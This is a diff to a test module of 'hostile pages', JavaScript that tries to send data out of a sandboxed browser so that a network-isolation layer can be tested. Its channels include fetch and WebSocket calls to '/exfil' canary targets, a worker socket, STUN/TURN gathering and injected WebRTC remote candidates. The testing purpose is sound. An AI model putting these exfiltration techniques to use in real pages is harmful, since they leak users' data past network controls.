@@ -1,6 +1,6 @@
 """The hostile pages (`tests/test_hostile_pages.py`): for each way a page might
-send data out, a page whose script tries it every way that method has, each
-attempt aimed at a canary of its own. Strings rather than files under
+send data out, a page whose script tries the ways ADR-0026's amendment on
+hostile pages lists, each attempt aimed at a canary of its own. Strings rather than files under
 `tests/fixtures/pages/`: fallow (ADR-0018) analyzes every `.js` file outside
 `bench/apps/`.
 
@@ -60,6 +60,7 @@ const socket = (url) => new Promise((done) => {
     opened.onopen = () => done("open");
     opened.onerror = () => done("error");
     opened.onclose = () => done("closed");
+    setTimeout(() => done("timeout"), 5000);
 });
 const socketInAWorker = (url) => new Promise((done) => {
     const code = `
@@ -72,6 +73,7 @@ const socketInAWorker = (url) => new Promise((done) => {
         URL.createObjectURL(new Blob([code], {type: "text/javascript"}))
     );
     worker.onmessage = (event) => done(event.data);
+    setTimeout(() => done("timeout"), 5000);
 });
 const gather = async (iceServers) => {
     const peer = new RTCPeerConnection({iceServers});
@@ -87,8 +89,26 @@ const gather = async (iceServers) => {
             if (peer.iceGatheringState === "complete") done();
         };
     });
+    const gathering = peer.iceGatheringState;
     peer.close();
-    return candidates;
+    return {candidates, gathering};
+};
+// A peer connection that negotiated with a second one, so it takes remote
+// candidates, and the second.
+const negotiated = async () => {
+    const peer = new RTCPeerConnection();
+    peer.createDataChannel("exfil");
+    await peer.setLocalDescription(await peer.createOffer());
+    const answerer = new RTCPeerConnection();
+    await answerer.setRemoteDescription(peer.localDescription);
+    await answerer.setLocalDescription(await answerer.createAnswer());
+    await peer.setRemoteDescription(answerer.localDescription);
+    return [peer, answerer];
+};
+// A target's address, without brackets, and port, as a candidate writes them.
+const addressAndPort = (target) => {
+    const at = target.lastIndexOf(":");
+    return [target.slice(0, at).replace("[", "").replace("]", ""), target.slice(at + 1)];
 };
 const post = (action) => new Promise((done) => {
     const frame = document.createElement("iframe");
@@ -162,7 +182,7 @@ PAGES = {
     "webrtc": HostilePage(
         {"stun": UDP4, "turn_udp": UDP4, "turn_tcp": TCP4},
         """async (t) => ({
-            candidates: await gather([
+            gathered: await gather([
                 {urls: `stun:${t.stun}`},
                 {
                     urls: `turn:${t.turn_udp}?transport=udp`,
@@ -176,6 +196,33 @@ PAGES = {
                 },
             ]),
         })""",
+    ),
+    # Remote candidates the page writes itself, at address literals: a
+    # browser checks connectivity to each, with no STUN or TURN server.
+    "webrtc_remote": HostilePage(
+        {"udp": UDP4, "tcp": TCP4, "udp6": UDP6, "tcp6": TCP6},
+        """async (t) => {
+            const [peer, answerer] = await negotiated();
+            const lines = {
+                udp: [1, "udp", "typ host"],
+                tcp: [2, "tcp", "typ host tcptype passive"],
+                udp6: [3, "udp", "typ host"],
+                tcp6: [4, "tcp", "typ host tcptype passive"],
+            };
+            const outcomes = {};
+            for (const [name, [id, protocol, kind]] of Object.entries(lines)) {
+                const [address, port] = addressAndPort(t[name]);
+                const candidate =
+                    `candidate:${id} 1 ${protocol} 2122260223 ${address} ${port} ${kind}`;
+                outcomes[name] = await settled(
+                    peer.addIceCandidate({candidate, sdpMid: "0", sdpMLineIndex: 0})
+                );
+            }
+            await new Promise((done) => setTimeout(done, 3000));
+            peer.close();
+            answerer.close();
+            return outcomes;
+        }""",
     ),
     "quic": HostilePage(
         # The allowed https origin answers with `Alt-Svc: h3` naming the
@@ -212,7 +259,7 @@ PAGES = {
             mapped: await settled(fetch(`http://${t.mapped}/exfil`)),
             hop: await settled(fetch(hop(t, `http://${t.hop}/exfil`))),
             worker: await socketInAWorker(`ws://${t.worker}/exfil`),
-            candidates: await gather([{urls: `stun:${t.stun}`}]),
+            gathered: await gather([{urls: `stun:${t.stun}`}]),
         })""",
     ),
     "dns_prefetch": HostilePage(
@@ -286,9 +333,12 @@ PAGES = {
             const outcomes = {};
             for (const [name, url] of Object.entries(urls)) {
                 outcomes[name] = await settled(fetch(url));
-                await framed(url);
-                await navigated(url);
             }
+            // Side by side: a refused frame fires no load, so each waits out
+            // its timeout.
+            await Promise.all(
+                Object.values(urls).flatMap((url) => [framed(url), navigated(url)])
+            );
             return outcomes;
         }""",
     ),
